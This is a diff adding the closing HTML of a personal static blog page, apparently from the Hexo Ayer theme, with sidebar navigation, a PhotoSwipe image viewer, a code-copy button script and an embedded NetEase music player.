+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Ymnnb"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://47.109.32.204/cat/">猫猫</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://yunchenqwq.github.io/Genshin_Start.github.io/">嘻嘻</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=466343434&auto=1&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
